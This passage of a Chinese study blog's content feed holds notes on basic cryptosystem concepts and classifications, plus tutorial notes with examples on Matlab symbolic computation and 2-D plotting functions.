密码系统要达到实际安全性，就要满足以下准则：<br>（1）破译该密码系统的实际计算量（包括计算时间或费用）十分巨大，以致于在实际上是无法实现的。<br>（2）破译该密码系统所需要的计算时间超过被加密信息有用的生命周期。。<br>（3）破译该密码系统的费用超过被加密信息本身的价值。</p><p>密码系统的柯克霍夫斯（Kerckhoffs）原则：<br>       即使密码系统中的算法为密码分析者所知，也难以从截获的密文推导出明文或密钥。<br>      也就是说，密码体制的安全性仅应依赖于对密钥的保密，而不应依赖于对算法的保密。<br>      只有在假设攻击者对密码算法有充分的研究，并且拥有足够的计算资源的情况下仍然安全的密码才是安全的密码系统。 </p><p> 综上，一个提供机密性服务的密码系统是实际可用的，必须满足的基本要求：<br>系统的保密性不依赖于对加密体制或算法的保密，而仅依赖于密钥的安全性。<br>满足实际安全性，使破译者取得密文后在有效时间和成本范围内，确定密钥或相应明文在计算上是不可行的。<br>加密和解密算法应适用于明文空间、密钥空间中的所有元素。<br>加密和解密算法能有效地计算，密码系统易于实现和使用。</p><h4 id="密码体制的分类"><a href="#密码体制的分类" class="headerlink" title="密码体制的分类"></a>密码体制的分类</h4><p>对密码体制的分类方法有多种，常用的分类方法有以下三种。</p><ol><li>根据密钥个数</li></ol><p>根据加密算法与解密算法所使用的密钥是否相同，可以将密码体制分为：对称密码体制(Symmetric cipher，也称为单钥密码体制、秘密密钥密码体制、对称密钥密码体制或常规密码体制)与非对称密码体制(Asymmetric cipher，也称为双钥密码体制、公开密钥密码体制、非对称密钥密码体制)如果一个提供保密服务的密码系统，它的加密密钥和解密密钥相同，或者虽然不相同，但由其中的任意—个可以很容易地导出另外一个，那么该系统所采用的就是对称密码体制。<br>如果一个提供保密服务的密码系统，其加密算法和解密算法分别用两个不同的密钥实现，并且由加密密钥不能推导出解密密钥，则该系统所采用的就是非对称密码体制。 采用非对称密钥密码体制的每个用户都有一对选定的密钥。其中一个是可以公开的，称为公开密钥（Public key），简称公钥；另一个由用户自己秘密保存，称为私有密钥（Private key），简称私钥。</p><p>在安全性方面，对称密钥密码体制是基于复杂的非线性变换与迭代运算实现算法安全性的，而非对称密钥密码体制则一般是基于某个公认的数学难题而实现安全性的。</p><p>根据对明文信息的处理方式</p><ol start="2"><li>根据密码算法对明文信息的处理方式，可将对称密码体制分为：<ul><li>分组密码（Block cipher）</li><li>序列密码（Stream cipher，也称为流密码）。</li></ul></li></ol><p>分组密码是将消息进行分组，一次处理一个数据块（分组）元素的输入，对每个输入块产生一个输出块。在用分组密码加密时，一个明文分组被当做一个整体来产生一个等长的密文分组输出。分组密码通常使用的分组大小是64比特或128比特。<br> 序列密码则是连续地处理输入元素，并随着处理过程的进行，一次产生一个元素的输出，在用序列密码加密时，一次加密一个比特或一个字节。</p><p>（3）根据是否能进行可逆的加密变换<br>     根据密码算法是否能进行可逆的加密变换，可以将密码体制分为：<br>        单向函数密码体制<br>        双向变换密码体制。</p><p>  单向函数密码体制是一类特殊的密码体制，其性质是可以很容易地把明文转换成密文，但再把密文转换成正确的明文却是不可行的，有时甚至是不可能的。<br>  单向函数只适用于某种特殊的、不需要解密的应用场合，如用户口令的存储和信息的完整性保护与鉴别等。<br>  双向变换密码体制是指能够进行可逆的加密、解密变换，绝大多数加密算法都属于这一类，它要求所使用的密码算法能够进行可逆的双向加解密变换，否则接收者就无法把密文还原成明文。<br>  其他的方法，按照在加密过程中是否引入了客观随机因素，可以分为确定型密码体制和概率密码体制等等。</p><p>1.3.6 对称与非对称密码体制的主要特点 </p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/01/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A61/3.png"></p><p>对称密码体制的主要优势是：<br>  加密、解密运算的处理速度块，效率高，算法安全性高。<br>对称密码体制存在的局限性或不足：<br>（1）对称密码算法的密钥分发过程复杂，所花代价高；<br>（2）密钥管理量的困难；<br>（3）保密通信系统的开放性差；<br>（4）存在数字签名的困难性。 </p><p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/01/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A61/4.png"></p><p>非对称密码体制的主要优势是：<br>（1）密钥分配简单。<br>（2）系统密钥量少，便于管理。<br>（3）系统开放性好。<br>（4）可以实现数字签名。<br>     非对称密码体制存在的局限性是加密、解密运算效率较低，处理速度较慢，同等安全强度下，非对称密码体制的密钥位数较多。<br>  另外，由于加密密钥是公开发布的，客观上存在“可能报文攻击”的威胁。  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 学习记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matlab符号运算</title>
      <link href="/2022/01/16/Matlab%E7%AC%A6%E5%8F%B7%E8%BF%90%E7%AE%97/"/>
      <url>/2022/01/16/Matlab%E7%AC%A6%E5%8F%B7%E8%BF%90%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<h2 id="符号对象"><a href="#符号对象" class="headerlink" title="符号对象"></a>符号对象</h2><h3 id="符号对象的建立"><a href="#符号对象的建立" class="headerlink" title="符号对象的建立"></a>符号对象的建立</h3><ul><li><code>sym</code>函数</li><li><code>syms</code>命令</li></ul><h4 id="1-sym函数"><a href="#1-sym函数" class="headerlink" title="1 sym函数"></a><strong>1 sym函数</strong></h4><p>sym函数用于建立单个符号对象，其常用调用格式为：<code>符号对象名=sym(A)</code><br>将由A来建立符号对象。其中，A可以是一个数值常量、数值矩阵或数值表达式（<code>不加单引号</code>），此时符号对象为一个符号常量；A也可以是一个变量名（<code>加单引号</code>），这是符号对象为一个符号常量。</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token comment">%例1 符号常量</span><span class="token operator">></span><span class="token operator">></span> t<span class="token operator">=</span><span class="token function">sym</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">></span> t<span class="token operator">+</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">></span><span class="token operator">></span> <span class="token function">sin</span><span class="token punctuation">(</span><span class="token function">sym</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment">%sin(sym(pi/3))得到的是一个表达式</span><span class="token operator">></span><span class="token operator">></span> <span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">)</span>   <span class="token comment">%sin(pi/3)得到的是一个数值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token comment">%例2 符号变量</span><span class="token operator">></span><span class="token operator">></span> a<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">></span> b<span class="token operator">=</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">></span> x<span class="token operator">=</span><span class="token function">sym</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">></span> y<span class="token operator">=</span><span class="token function">sym</span><span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">></span> w<span class="token operator">=</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>a<span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">></span> s<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>x<span class="token operator">-</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>结论：符号计算的结果是一个精确的数学表达式。数值计算的结果是一个数值。</strong>将符号表达式转化为数值结果，使用<code>eval()</code><strong>sym一次只能定义单个符号对象，如果符号对象很多，就不方便。</strong></p><h4 id="2-syms命令"><a href="#2-syms命令" class="headerlink" title="2 syms命令"></a><strong>2 syms命令</strong></h4><p>syms命令可以一次定义多个符号变量，其一般调用格式如下：<code>syms 符号变量1 符号变量2 ... 符号变量n</code></p><p>其中，变量名不能加单引号，相互之间用空格隔开。建立完符号对象，再用符号运算符连接起来，就组成了符号表达式。</p><h3 id="符号对象的运算"><a href="#符号对象的运算" class="headerlink" title="符号对象的运算"></a>符号对象的运算</h3><p><strong>&lt;1&gt;四则运算</strong><br>符号表达式的四则运算与数值运算一样，用<code>+、-、*、/</code>运算符实现，其运算结果依然是一个符号表达式。</p><p><strong>&lt;2&gt;关系运算</strong></p><ul><li>6种关系运算符：<code>&lt;、&lt;=、&gt;、&gt;=、==、~=</code>。</li><li>对应的6个函数：<code>lt()、le()、gt()、ge()、ge()、eq()、ne()</code>。</li></ul><p>若参与运算的是<code>符号表达式</code>，其结果是一个符<code>号关系表达式</code>；若参与运算的是<code>符号矩阵</code>，其结果是由符号关系表达式组成的矩阵。</p><p>在进行符号对象的运算前，可用<code>assume</code>函数对符号对象设置域，函数调用格式为：<br><code>assume(condition)</code><br><code>assume(expr, set)</code></p><p>第一种格式指定变量满足条件condition，第二种格式指定表达式expr属于set</p><p><strong>3 逻辑运算</strong></p><ul><li>3种逻辑运算符：<code>&amp;(与)、|(或)和~(非)</code></li><li>4个逻辑运算函数：<code>and()、or()、not()和xor()</code></li></ul><p><strong>&lt;4&gt;因式分解与展开运算</strong><br>MATLAB提供了对符号表达式进行因式分解、展开、合并的函数，函数的调用格式为：<br><code>fator(s)</code>：对符号表达式s分解因式。</p><p><code>expand(s)</code>：对符号表达式s进行展开。<br><code>collect(s)</code>：对符号表达式s合并同类项。<br><code>collect(s, v)</code>：对符号表达式s按变量v合并同类项。</p><p><strong>5 其他计算</strong></p><ul><li><p>1 提取有理分式的分子分母：<code>[n, d]=numden(s)</code></p></li><li><p>2 提取符号表达式的系数(低位到高位)：<code>c=coeffs(s, x)</code></p></li><li><p>3 符号表达式化简：<code>simplify(s)</code></p></li><li><p>4符号多项式与多项式系数向量之间的转换：<br>符号多项式转换为多项式系数向量：<code>p=sym2poly(s)</code><br>多项式系数向量转换为符号多项式：<code>s=ploy2sum()</code></p></li></ul><p><strong>f只能有一种符号变量</strong></p><p><strong>6 符号运算中变量的确定</strong></p><ul><li><p>如果没有明确指定自变量，MATLAB将按以下原则确定主变量并对其进行相应运算：<br>寻找除了i、j之外，在字母顺序上最接近x的小写字母。<br>若表达式中有两个符号变量与x的距离相等，则ASCII码大者优先。</p></li><li><p><code>symvar()</code>函数可以用于查找一个符号表达式中的符号变量，函数的调用格式为：<code>symvar(s,n)</code>。函数返回符号符号表达式s中的n个符号变量。因此，可以用<code>symvar(s, 1)</code>查找表达式s的主变量。</p></li></ul><h3 id="符号矩阵"><a href="#符号矩阵" class="headerlink" title="符号矩阵"></a>符号矩阵</h3><p>符号矩阵也是一种符号表达式，所以符号表达式运算都可以在矩阵意义下进行。<br>注意：这些函数作用于符号矩阵时，是分别作用于矩阵的每一个元素。</p><p><strong>由于符号矩阵也是矩阵，所以有关矩阵的函数也可以使用。</strong></p><h2 id="符号微积分"><a href="#符号微积分" class="headerlink" title="符号微积分"></a>符号微积分</h2><h3 id="符号函数的极限"><a href="#符号函数的极限" class="headerlink" title="符号函数的极限"></a>符号函数的极限</h3><p><strong>1 符号函数的极限</strong></p><ul><li>求符号函数极限的命令<code>limit</code>，其调用格式为：<code>limit(f, X, a)</code>即求函数f关于变量x在a点的极限。若x省略，则采用系统默认的自变量。a的默认值为0。</li><li><code>limit</code>函数的另一种功能是求单边极限，其调用格式为：<br><code>limit(f, x, a, &#39;right&#39;)</code><br><code>limit(f,x,a,&#39;left&#39;)</code></li></ul><h3 id="符号函数的导数"><a href="#符号函数的导数" class="headerlink" title="符号函数的导数"></a>符号函数的导数</h3><p>MATLAB中的求导函数为：<code>diff(f, x, n)</code><br>即求函数f关于变量x的n阶导数。参数x的用法同求极限函数<code>limit</code>，可以缺省，默认值与<code>limit</code>相同，n的默认值是1。</p><p>极限、导数、微分的概念是紧密关联的。有极限是可导的前提，而导数是微分之商，因此导数也称为微商。</p><h3 id="符号函数的积分"><a href="#符号函数的积分" class="headerlink" title="符号函数的积分"></a>符号函数的积分</h3><p><strong>1 不定积分</strong></p><p>在MATLAB中，求不定积分的函数是<code>int</code>，其常用调用格式为：<code>int(f, x)</code>求函数f对变量x的不定积分。</p><p><strong>2 定积分</strong><br>在MATLAB中，定积分的计算也使用int命令，但调用格式有区别：<code>int(f, a, b)</code><br>其中，a、b分别表示定积分的下限和上限。</p><ul><li>当函数关于变量x在闭区间[a, b]可积时，函数返回一个定积分的结果。</li><li>当a、b中有一个是inf时，函数返回一个广义积分。</li><li>当a、b中有一个是符号表达式时，函数返回一个符号函数。</li></ul><h2 id="级数"><a href="#级数" class="headerlink" title="级数"></a>级数</h2><h3 id="级数求和"><a href="#级数求和" class="headerlink" title="级数求和"></a>级数求和</h3><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/31.png"></p><h3 id="泰勒级数"><a href="#泰勒级数" class="headerlink" title="泰勒级数"></a>泰勒级数</h3><p>MATLAB提供了taylor( )函数将函数展开为幂级数。其调用格式为:</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">taylor</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span>v<span class="token punctuation">,</span>a<span class="token punctuation">,</span>Name<span class="token punctuation">,</span>Value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该函数将函数f按变量v在a点展开为泰勒级数,v省略时按默认规则确定变量,a的默认值是0。Name和Value为选项设置，经常成对使用，前者为选项名，后者为该选项的值。</p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/32.png"></p><h2 id="符号方程求解"><a href="#符号方程求解" class="headerlink" title="符号方程求解"></a>符号方程求解</h2><h3 id="代数方程"><a href="#代数方程" class="headerlink" title="代数方程"></a>代数方程</h3><p>在MATLAB中，求解用符号表达式表示的代数方程可由函数solve( )实现，其调用格式为:</p><ul><li>solve(s):求解符号表达式s的代数方程，求解变量为默认变量。</li><li>solve(s,v):求解符号表达式s的代数方程，求解变量为v。</li><li>solvel(s1,s2… ,sn,vl,v2,…,vn):求解符号表达式s1，s2，… , sn组成的代数方程组，求解变量分别为v1，v2，…， vn。</li></ul><h3 id="常微分方程"><a href="#常微分方程" class="headerlink" title="常微分方程"></a>常微分方程</h3><p><img src="https://img-blog.csdnimg.cn/20200228144745293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20200228144809449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDM3ODgzNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> Matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matlab绘图</title>
      <link href="/2022/01/12/Matlab%E4%B9%8B%E5%9B%BE%E5%83%8F%E7%BB%98%E5%88%B6/"/>
      <url>/2022/01/12/Matlab%E4%B9%8B%E5%9B%BE%E5%83%8F%E7%BB%98%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="二维曲线"><a href="#二维曲线" class="headerlink" title="二维曲线"></a>二维曲线</h2><h3 id="plot函数："><a href="#plot函数：" class="headerlink" title="plot函数："></a>plot函数：</h3><p>(1)plot函数的基本用法: plot(x,y)其中，x和y分别用于存储x坐标和y坐标数据。</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token comment">%例一 绘制一条折线</span>x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2.5</span><span class="token punctuation">,</span><span class="token number">3.5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1.5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1.5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>(2)最简单的plot函数的调用格式： plot(x)   图形的横坐标，是x元素的索引。</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1.5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1.5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当plot函数的参数x是复数向量时，则分别以该向量元素实部和虚部为横,纵坐标4绘制出一条曲线。</p><p>(3)plot(x,y)函数参数的变化形式</p><p>当x是向量，y是矩阵时</p><ol><li>如果矩阵y的列数等于x的长度，则以向量x为横坐标，以y的每个行向量为纵坐标绘制曲线，曲线的条数等于y的行数</li><li>如果矩阵y的行数等于x的长度，则以向量x为横坐标，以y的每个列向量为纵坐标绘制曲线，曲线的条数等于y的列数。</li></ol><p>当x、y是同型矩阵时</p><p>以x、y对应列元素为横、纵坐标分别绘制曲线，曲线条数等于矩阵的列数</p><p>(4)含多个输入参数plot函数plot(x1,y1,x2,y2,…,xn,yn)</p><p>其中，每一个向量对构成一组数据点的横、纵坐标，绘制一条曲线。</p><p>(5)含选项的plot函数  plot(x,y,选项)</p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/20.png"></p><h3 id="fplot函数："><a href="#fplot函数：" class="headerlink" title="fplot函数："></a>fplot函数：</h3><p><strong>x往往采取等间隔采样，如果在函数随着自变量的变化未知或者在不同区间的函数频率特性差别大，如果采用<code>plot</code>函数时自变量的采样间隔设置不合理，则无法反映函数的变化趋势。</strong></p><p>如何解决这个问题呢？<strong>——<code>fplot</code>可根据参数函数的变化特性，自适应地设置采样间隔。</strong></p><p>(1)fplot函数的基本用法：  fplot(f,lims,选项)</p><p>其中，f代表一个函数，通常采用函数句柄的形式。lims为x轴的取值范围，用二元向量[xmin,xmax]描述，默认值为[-5,5]。选项定义与plot函数相同。</p><p>(2）双输入函数参数的用法       fplot(funx, funy, tlims,选项)<br>其中，funx、funy代表函数，通常采用函数句柄的形式。tlims为参数函数funx和funy的自变量的取值范围，用二元向量[tmin，tmax]描述。</p><h2 id="绘制图形的辅助操作"><a href="#绘制图形的辅助操作" class="headerlink" title="绘制图形的辅助操作"></a>绘制图形的辅助操作</h2><h3 id="给图形添加标注"><a href="#给图形添加标注" class="headerlink" title="给图形添加标注"></a>给图形添加标注</h3><ol><li><p>title函数</p><ul><li><p>title函数的基本用法：   title(图形标题)</p></li><li><p>在图形标题中使用Latex格式控制符：   <strong>\bf 加粗  \it 斜体  \rm  整体</strong></p></li><li><p>含属性设置的title函数   title(图形标题,属性名,属性值)</p><p>Color属性：用于设置图形标题文本的颜色。</p><p>FontSize属性： 用于设置标题文字的字号。</p></li></ul></li><li><p>xlabel函数和ylabel函数    xlabel(x轴说明)     ylable(y轴说明)</p></li><li><p>text函数和gtext函数：  </p><p>text(x,y,说明)     gtext(说明)</p><p><code>gtext</code>函数没有坐标参数，执行命令时，十字光标跟随鼠标移动，单击鼠标，即可将说明放置在十字光标处。</p></li><li><p>legend函数      legend(图例1,图例2,…)</p></li></ol><h3 id="坐标控制"><a href="#坐标控制" class="headerlink" title="坐标控制"></a>坐标控制</h3><ol><li><p>axis函数</p><ul><li><p>axis([xmin,xmax,ymin,ymax,zmin,zmax])</p></li><li><p>axis的其他用法：</p><p>axis equal:  纵、横坐标采用等长刻度       axis square:   产生正方形坐标系(默认为矩形)   </p><p>axis auto:    使用默认设置     axis off：    取消坐标轴       axis on：  显示坐标轴</p><p><code>axis equal</code>后，如：x轴0到1长度等于y轴0到1长度。消除因为x轴和y轴刻度长不等带来的图像变形。</p></li></ul></li><li><p>给坐标系加网格和边框(grid)</p><p>grid on:控制显示网格线     grid off:控制不显示网格线     grid:在两种状态之间进行切换</p><p>box函数   box on,box off,box。用法同grid。</p></li><li><p>图形保持(hold)</p><p>在已经存在的图形叠加图形</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">hold on   <span class="token comment">% 控制保持原有图形</span>hold off  <span class="token comment">% 控制刷新图形窗口</span>hold      <span class="token comment">% 两种模式间切换</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>d 图形窗口的分割(subplot)</p><p>子图：同一图形窗口中的不同坐标系下的图形称为子图。</p><p>subplot函数： subplot(m,n,p)  其中，m,n指定将图形窗口分成m * n个绘图区，p指定当前活动区。</p></li></ol><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">x<span class="token operator">=</span><span class="token function">linspace</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">%将整个坐标图分成两行两列，按行数的第一个子图</span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'sin(x)-1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">axis</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">%将整个坐标图分成两行1列，按行数的第2个子图</span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token function">cos</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'cos(x)+1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">axis</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">%将整个坐标图分成4行4列，按行数的第3个子图</span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token function">tan</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'tan(x)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">axis</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment">%将整个坐标图分成4行4列，按行数的第8个子图</span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token function">cot</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'cot(x)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">axis</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/22.png"></p><h2 id="其他形式的二维图形"><a href="#其他形式的二维图形" class="headerlink" title="其他形式的二维图形"></a>其他形式的二维图形</h2><h3 id="其他坐标系下的二维曲线图"><a href="#其他坐标系下的二维曲线图" class="headerlink" title="其他坐标系下的二维曲线图"></a>其他坐标系下的二维曲线图</h3><ol><li><p>对数坐标图(semilogx;semilogy;loglog)</p><p>semilogx: x使用常用对数刻度,y为线性刻度</p><p>semilogy: y使用常用对数刻度,x为线性刻度</p><p>loglog:x,y都使用常用对数刻度</p></li><li><p>极坐标图(polar)</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">polar</span><span class="token punctuation">(</span>theta<span class="token punctuation">,</span>rho<span class="token punctuation">,</span>选项<span class="token punctuation">)</span> <span class="token comment">%其中,theta为极角，rho为极径，选项的内容与plot函数相同。</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="统计图"><a href="#统计图" class="headerlink" title="统计图"></a>统计图</h3><ol><li><p>条形类图形（bar、barh；hist、rose）</p><p>条形图：</p><p>bar函数:    竖直条形图，bar(y,style)其中y是数据,选项style用于指定分组排列模式。grouped簇状分组，stacked堆积分组。   bar(x,y,style)其中，x存储横坐标，y存储数据</p><p>barh函数:水平条形图   使用方式与bar函数类型</p><p>直方图：</p><p>hist函数:直角坐标系 </p><p>hist(y)，hist(y,x)其中，参数y是要统计的数据，x用于指定区间的划分方式。</p><p>x:用于设置统计区间的划分方式，若统计数据为标量，则统计数据均分为x个小区间，若x是向量，则x中的每一个数指定分组的中心值，元素的个数为数据分组数，x缺省时，默认按10个等分区间进行统计。</p><p>rose函数:极坐标系</p><p>rose(theta,x) 其中，参数theta用于确定每一区间与原点的角度，选项x用于指定区间的划分方式。</p><p>theta:是一个向量，绘图时将圆划分为若干个角度相等的扇形区域，每个扇形高度为落入这个扇形区域的theta个数。如果x是标量，则将0到2pi划分为x个扇形区域，默认20。</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token comment">%  绘制高斯分布数据在极坐标下的直方图。</span>y<span class="token operator">=</span><span class="token function">randn</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>theta<span class="token operator">=</span>y<span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">;</span><span class="token function">rose</span><span class="token punctuation">(</span>theta<span class="token punctuation">)</span><span class="token function">title</span><span class="token punctuation">(</span>"在极坐标下的直方图"<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>面积类图形（pie;area）</p><ul><li><p>1扇形图 pie函数  pie(x,explode)</p><p>其中，参数x存储待统计数据，选项explode控制图块的显示模式</p></li><li><p>2面积图 area函数 area(x, y)：</p><p>该函数以参数x和y绘制面积图。如果x和y为向量，则相当于函数plot(x, y)，并将0到y之间进行了填充。如果参数y为矩阵，则将y的每一列绘制面积图并进行叠加。</p></li></ul></li><li><p>散点类图形（scatter;stairs;stem）</p><ul><li><p>scatter函数： 散点图</p><p>scatter(x,y,选项,’filled’)参数x,y用于定位数据点，选项用于指定线型，颜色，数据点标记。</p><p><strong>filed:填充数据点标记</strong></p></li><li><p>stairs函数： 阶梯图</p></li><li><p>stem函数： 杆图</p></li></ul></li></ol><h3 id="矢量图形-compass-feather-quiver"><a href="#矢量图形-compass-feather-quiver" class="headerlink" title="矢量图形(compass;feather;quiver)"></a>矢量图形(compass;feather;quiver)</h3><p><img 